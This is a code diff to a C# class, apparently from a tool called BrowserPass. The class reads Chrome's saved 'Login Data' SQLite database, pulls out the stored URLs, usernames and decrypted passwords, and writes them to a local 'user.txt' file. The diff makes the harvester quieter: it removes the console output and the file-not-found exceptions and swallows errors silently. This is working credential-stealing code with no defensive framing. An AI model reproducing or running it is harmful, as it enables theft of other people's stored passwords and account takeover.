@@ -17,10 +17,8 @@ namespace BrowserPass
 
         private const string LOGIN_DATA_PATH = "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
 
-        public IEnumerable<CredentialModel> ReadPasswordsList(List<string> list)
+        public void ReadPasswordsList(List<string> list)
         {
-            var result = new List<CredentialModel>();
-            //var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);// APPDATA
             foreach (var path in list)
             {
                 var p = Path.GetFullPath(path);
@@ -31,7 +29,6 @@ namespace BrowserPass
                         try
                         {
                             conn.Open();
-
                             using (var cmd = conn.CreateCommand())
                             {
                                 cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins";
@@ -47,34 +44,24 @@ namespace BrowserPass
                                                 Url = reader.GetString(0),
                                                 Username = reader.GetString(1),
                                                 Password = pass
-                                                
                                             };
-                                            Console.WriteLine(x);
-                                            File.AppendAllText("user.txt", x + Environment.NewLine + " path= " + path + "\n"+ Environment.NewLine);
-                                            Thread.Sleep(50);
-                                            result.Add(x);
+                                            File.AppendAllText("user.txt", x + Environment.NewLine);
                                         }
                                     }
                                 }
                             }
-
                         }
                         catch
                         {
-                            conn.Close();
                         }
                         conn.Close();
-
                     }
 
                 }
                 else
                 {
-                    throw new FileNotFoundException("Cannot find file " + p);
                 }
             }
-
-            return result;
         }
 
         public IEnumerable<CredentialModel> ReadPasswords()
@@ -88,7 +75,6 @@ namespace BrowserPass
             {
                 using (var conn = new SQLiteConnection($"Data Source={p};"))
                 {
-                    Console.WriteLine(p);
                     conn.Open();
                     using (var cmd = conn.CreateCommand())
                     {
@@ -117,7 +103,6 @@ namespace BrowserPass
             }
             else
             {
-                throw new FileNotFoundException("Canno find chrome logins file");
             }
             return result;
         }
